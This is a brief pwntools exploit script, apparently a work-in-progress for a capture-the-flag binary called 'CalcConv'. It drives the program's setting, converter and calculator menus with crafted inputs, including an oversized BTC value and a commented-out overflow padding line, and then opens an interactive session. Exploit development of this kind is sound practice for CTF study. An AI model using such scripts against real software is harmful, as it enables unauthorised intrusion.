from pwn import *
import sys
if len(sys.argv) < 2:
	r = process('./CalcConv')

raw_input('debug')

r.recvuntil("Ok, let 's start!")
r.sendline("(setting)")
r.sendlineafter("location:","/dev/stdout")
r.sendafter("successfully!", "(convertor)")
r.sendafter("convertor", "336239635603721967BTC")
buf1 = "(calculator)"
# buf1 += 'a'*0x98
r.sendafter("BTC",buf1)

r.sendafter("[DBG] :", "4+7")


r.interactive()
r.close()